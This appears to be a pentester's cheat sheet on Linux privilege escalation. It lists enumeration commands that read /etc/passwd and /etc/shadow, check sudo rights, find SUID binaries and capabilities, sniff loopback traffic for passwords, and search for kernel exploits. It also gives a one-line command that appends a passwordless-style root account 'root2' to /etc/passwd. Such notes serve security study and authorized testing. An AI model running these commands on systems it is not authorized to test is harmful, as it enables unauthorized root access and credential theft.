# Linux Privilege Escalation

[https://sirensecurity.io/blog/blog-archive-all-posts/](https://sirensecurity.io/blog/blog-archive-all-posts/)

#### Enumerating Linux <a href="#enumerating-linux" id="enumerating-linux"></a>

**Manually**

* User and host information



```
id
cat /etc/passwd
ls -la /etc/shadow
hostname
sudo -l
```

* OS Information



```
cat /etc/issue
cat /etc/*release
uname -a
```

* Enumerating Processes



```
ps -aux
./pspy64
```

* Networking Information

```
ifconfig
ip a

route 
routel

netstat -anp
ss -anp
```

* Firewall rules

```
cat /etc/iptables/rules.v4
```

* Scheduled Tasks

```
ls -lah /etc/cron*
crontab -l
sudo crontab -l
```

* Installed Application (Tiring Manually)

```
dpkg -l
```

* Writable Directories

```
find / -writable -type d 2>/dev/null
```

* Mounted Drives

```
cat /etc/fstab
mount
lsblk
```

* Loaded Kernel drivers and Modules

```
lsmod
modinfo <moduleName>
```

* SUID and SGID

```
find / -perm -u=s -type f 2>/dev/null
```

> References: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md https://book.hacktricks.xyz/linux-hardening/privilege-escalation

**Automated**

```
./unix-privesc-check standard
./linpeas.sh
```

#### Exposed Confidential Information <a href="#exposed-confidential-information" id="exposed-confidential-information"></a>

**User Trails**

```
env
cat .bashrc
history
```

**Service Footprints**

```
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
```

#### Insecure File Permissions <a href="#insecure-file-permissions" id="insecure-file-permissions"></a>

**Cron Jobs**

```
grep "CRON" /var/log/syslog
cat /var/log/cron.log
```

**Password Authentication**

```
ls -la /etc/passwd

openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

#### Abusing System Linux components <a href="#abusing-system-linux-components" id="abusing-system-linux-components"></a>

**SUID Binaries (GTFObins to the rescue)**

* SUID

```
find / -perm -u=s -type f 2>/dev/null
```

* Capabilities

```
/usr/sbin/getcap -r / 2>/dev/null
```

**SUDO Abuse**

https://github.com/rabiulhsantahin/ctf/blob/main/sudo-exploit.txt

```
sudo -l
sudo -V
aa-status
```

**Kernel Exploits**

```
cat /etc/issue
uname -r
arch
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0"
```
